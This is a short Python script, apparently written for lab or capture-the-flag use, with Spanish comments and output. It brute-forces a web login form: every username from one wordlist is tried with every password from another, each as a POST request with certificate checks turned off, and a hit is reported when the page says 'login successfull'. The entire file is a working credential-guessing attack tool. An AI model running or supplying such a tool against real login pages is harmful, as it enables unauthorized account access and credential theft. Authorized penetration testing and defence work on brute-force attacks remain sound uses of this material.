import requests
import argparse

#Proxy ha sido declarado en caso de 


def brute_force(url, username, password):
   

    headers = {
        'User-Agent': 'python-requests/2.32.3',
        'Accept-Encoding': 'gzip, deflate',
    }



    with open(password, 'r') as passwd:
        passwords = [line.strip() for line in passwd]

        with open(username,'r') as user:
            for usernames in user:
                usernames = usernames.strip()
                print(f'Iniciando fuerza bruta con el usuario: {usernames}')
        
                for pwds in passwords:
                    pwds = pwds.strip()
                    data = {
                        'username': usernames,
                        'password': pwds
                    }
                    try:
                        r = requests.post(url, data=data, headers=headers, verify=False)
                    except Exception as error:
                        print("Hubo un error. Puede ser que el servidor no este disponible.")
                        continue
                    if "login successfull" in r.text:
                        print(f'El usuario {usernames} su contrasena: {pwds}')
                    else:
                        print(f"{usernames}:{pwds} Invalid")

if __name__=="__main__":
    parser = argparse.ArgumentParser(description='Login Brute Force')
    parser.add_argument('--url',required=True, help='URL objetivo EJ: http://10.10.10.101/login.php')
    parser.add_argument('--username', required=True, help='Lista de usuarios Ej: usernames.txt')
    parser.add_argument('--password',required=True, help='Lista de contrasenas Ej: password.txt')
    args = parser.parse_args()
    brute_force(args.url,args.username,args.password)  
